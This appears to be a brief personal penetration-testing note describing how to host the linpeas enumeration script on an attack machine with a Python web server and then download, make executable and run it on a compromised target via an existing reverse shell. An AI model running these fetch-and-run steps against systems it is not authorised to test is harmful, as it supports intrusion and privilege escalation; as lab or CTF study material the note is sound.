- Bringing [[linpeas]] on to vulnerable machine to help exploitation
	- with a [[reverse shell]] running over a python simple server at port 6969
	- on attack machine 
		- `wget -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh`
		- start a simple python server on port 6969
		- `$ python3 -m http.server 6969`
	- on target machine 
		- navigate to /tmp
		- curl it down and run from attack machine
```bash
$ wget http://attack machine ip:port/linpeas.sh
$ chmod 777 linpeas.sh
$ ./linpeas.sh | tee /tmp/linpeas.txt
```
